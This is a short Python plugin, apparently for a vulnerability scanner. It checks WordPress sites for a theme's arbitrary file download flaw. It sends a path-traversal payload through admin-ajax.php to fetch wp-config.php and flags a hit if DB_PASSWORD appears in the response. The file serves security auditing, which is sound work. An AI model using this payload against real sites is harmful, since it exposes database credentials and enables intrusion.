#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

'''
某些wordpress主题存在任意文件下载漏洞
可以下载到配置文件
'''
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    path = 'wp-admin/admin-ajax.php'
    payload='?action=kbslider_show_image&img=../wp-config.php'
    
    code, head, res, errcode, _ = curl.curl(url + path+ payload)
    if code == 200:
        m = re.search('DB_PASSWORD', res)
        if m:
            security_info(res)
            
if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])